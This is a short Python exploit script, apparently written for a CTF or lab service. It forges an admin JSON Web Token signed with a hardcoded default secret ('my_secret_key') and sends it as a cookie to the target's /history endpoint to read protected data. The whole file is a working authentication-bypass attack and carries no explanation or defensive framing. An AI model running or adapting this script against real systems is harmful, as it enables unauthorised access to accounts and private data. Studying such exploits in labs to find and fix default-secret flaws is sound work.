#!/usr/bin/env python3
import argparse, requests, time, jwt

#START ME LIKE ./1.py 127.0.0.1 8181

def default_secret(ip, port, token, user):
    encoded_jwt = jwt.encode({"exp": int(time.time())+300,"username": user,"role": 1}, token, algorithm='HS256')
    try:
        r = requests.get(f"http://{ip}:{port}/history",cookies={"token":encoded_jwt})
        print(r.json())
    except Exception as e:
        print(e)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit the third vulnerability - default jwt token")
    parser.add_argument("ip", help="vulnerable host ip passed here")
    parser.add_argument("port", help="port to web")
    args = parser.parse_args()
    default_secret(args.ip, int(args.port), "my_secret_key", "admin")
